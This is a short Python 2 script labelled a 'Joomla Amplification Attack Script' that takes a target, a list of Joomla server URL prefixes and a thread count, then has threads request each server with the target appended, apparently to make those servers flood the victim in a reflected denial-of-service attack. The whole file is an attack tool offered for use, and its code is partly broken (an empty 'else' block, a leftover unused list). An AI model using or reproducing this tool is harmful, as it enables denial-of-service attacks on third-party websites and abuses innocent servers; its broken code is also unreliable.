#!/usr/bin/env python
import pycurl
import StringIO
import sys
import time
from multiprocessing import Process
import threading 

def deny():

    global joomlalist
    global currentserver
    global data
    global target
    joomlaserver = joomlalist[currentserver] 
    currentserver = currentserver + 1 
    ip = "".join((joomlaserver, target))
    c = pycurl.Curl()
    b = StringIO.StringIO()
    c.setopt(pycurl.WRITEFUNCTION, b.write)
    c.setopt(pycurl.TIMEOUT, 1)
    c.setopt(pycurl.CONNECTTIMEOUT, 1)
    c.setopt(c.URL, ip)
    try:
        c.perform()
    except Exception:
        gg = 88

    else:
      #Nothing 

def printhelp():
    print "Joomla Amplification Attack Script"
    print "Made By Zidane All Rights Reserved"
    print "Usage :  Joomla.py [TARGET] [LIST] [THREADS]"
    exit(0)

if len(sys.argv) < 4: 
    printhelp()

target = sys.argv[1]

if target in ("help","-h","h","?","--h","--help","/?"): 
    printhelp()

joomlaserverfile = sys.argv[2]
numberthreads = int(sys.argv[3])

ntplist = []
currentserver = 0

with open(joomlaserverfile) as f:
    joomlalist = f.readlines()

if numberthreads > int(len(joomlalist)):
    print "Too many threads used"
    exit(0)

threads = []
print "Attack In progress ..."

for n in range(numberthreads):
    thread = threading.Thread(target=deny)
    thread.daemon = True
    thread.start()

    threads.append(thread)

while True:
    time.sleep(1)